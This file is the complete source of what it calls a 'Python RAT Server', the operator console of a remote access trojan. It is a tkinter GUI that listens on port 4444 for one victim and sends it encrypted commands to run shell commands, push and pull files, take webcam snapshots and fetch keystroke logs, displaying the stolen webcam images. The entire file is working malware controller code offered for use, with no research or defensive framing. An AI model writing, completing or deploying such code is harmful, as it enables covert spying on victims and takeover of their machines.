import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox
from cryptography.fernet import Fernet
import base64
from PIL import Image, ImageTk
from io import BytesIO
import os
import struct

# ==== Encryption Key Setup ====
KEY_FILE = "rat_key.key"
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
else:
    with open(KEY_FILE, "rb") as f:
        key = f.read()
fernet = Fernet(key)

# ==== Globals ====
server_socket = None
client_socket = None
client_address = None

# ==== Helper functions for message framing ====
def send_msg(sock, message_bytes):
    msg_len = struct.pack('>I', len(message_bytes))
    sock.sendall(msg_len + message_bytes)

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_msg(sock):
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recvall(sock, msglen)

# ==== GUI Setup ====
root = tk.Tk()
root.title("Python RAT Server")
root.geometry("700x500")

cmd_label = tk.Label(root, text="Enter Command:")
cmd_label.pack(pady=5)
cmd_entry = tk.Entry(root, width=80)
cmd_entry.pack(pady=5)

btn_frame = tk.Frame(root)
btn_frame.pack(pady=5)

send_btn = tk.Button(btn_frame, text="Send Command")
send_btn.grid(row=0, column=0, padx=5)

upload_btn = tk.Button(btn_frame, text="Upload File")
upload_btn.grid(row=0, column=1, padx=5)

download_btn = tk.Button(btn_frame, text="Download File")
download_btn.grid(row=0, column=2, padx=5)

snapshot_btn = tk.Button(btn_frame, text="Get Webcam Snapshot")
snapshot_btn.grid(row=0, column=3, padx=5)

keylog_btn = tk.Button(btn_frame, text="Get Keylogs")
keylog_btn.grid(row=0, column=4, padx=5)

log_box = scrolledtext.ScrolledText(root, width=90, height=20)
log_box.pack(pady=10)

def log(message):
    log_box.insert(tk.END, message + "\n")
    log_box.see(tk.END)

# ==== Networking ====
def start_server():
    global server_socket, client_socket, client_address
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 4444))
    server_socket.listen(1)
    log("[INFO] Server listening on port 4444...")
    client_socket, client_address = server_socket.accept()
    log(f"[INFO] Connection from {client_address[0]}:{client_address[1]} established.")

    threading.Thread(target=receive_data, daemon=True).start()

def receive_data():
    global client_socket
    while True:
        try:
            data = recv_msg(client_socket)
            if data is None:
                log("[INFO] Client disconnected.")
                break

            decrypted = fernet.decrypt(data).decode()

            if decrypted.startswith("__image__::"):
                b64_data = decrypted.split("::", 1)[1]
                img_data = base64.b64decode(b64_data)
                img = Image.open(BytesIO(img_data))
                save_path = "received_snapshot.png"
                img.save(save_path)
                log(f"[INFO] Webcam snapshot saved as '{save_path}'")

                preview_win = tk.Toplevel(root)
                preview_win.title("Webcam Snapshot Preview")

                img_tk = ImageTk.PhotoImage(img)
                label = tk.Label(preview_win, image=img_tk)
                label.image = img_tk
                label.pack()

            else:
                log(f"[CLIENT] {decrypted}")

        except Exception as e:
            log(f"[ERROR] {e}")
            break

def send_command(cmd):
    global client_socket
    if client_socket:
        try:
            enc_cmd = fernet.encrypt(cmd.encode())
            send_msg(client_socket, enc_cmd)
            log(f"[SENT] {cmd}")
        except Exception as e:
            log(f"[ERROR] Failed to send command: {e}")
    else:
        log("[ERROR] No client connected.")

def send_upload_file():
    if not client_socket:
        log("[ERROR] No client connected.")
        return
    filepath = filedialog.askopenfilename()
    if not filepath:
        return
    try:
        with open(filepath, "rb") as f:
            b64data = base64.b64encode(f.read()).decode()
        filename = os.path.basename(filepath)
        cmd = f"__upload__::{filename}::{b64data}"
        send_command(cmd)
        log(f"[INFO] Upload command sent for file: {filename}")
    except Exception as e:
        log(f"[ERROR] File upload failed: {e}")

def send_download_file():
    if not client_socket:
        log("[ERROR] No client connected.")
        return
    filename = cmd_entry.get().strip()
    if not filename:
        messagebox.showwarning("Warning", "Please enter filename to download.")
        return
    cmd = f"__download__::{filename}"
    send_command(cmd)
    log(f"[INFO] Download command sent for file: {filename}")

def send_snapshot_cmd():
    if not client_socket:
        log("[ERROR] No client connected.")
        return
    cmd = "__snap__"
    send_command(cmd)
    log("[INFO] Webcam snapshot command sent.")

def send_keylog_cmd():
    if not client_socket:
        log("[ERROR] No client connected.")
        return
    cmd = "__keylog__"
    send_command(cmd)
    log("[INFO] Keylog command sent.")

send_btn.config(command=lambda: send_command(cmd_entry.get().strip()))
upload_btn.config(command=send_upload_file)
download_btn.config(command=send_download_file)
snapshot_btn.config(command=send_snapshot_cmd)
keylog_btn.config(command=send_keylog_cmd)

threading.Thread(target=start_server, daemon=True).start()

root.mainloop()
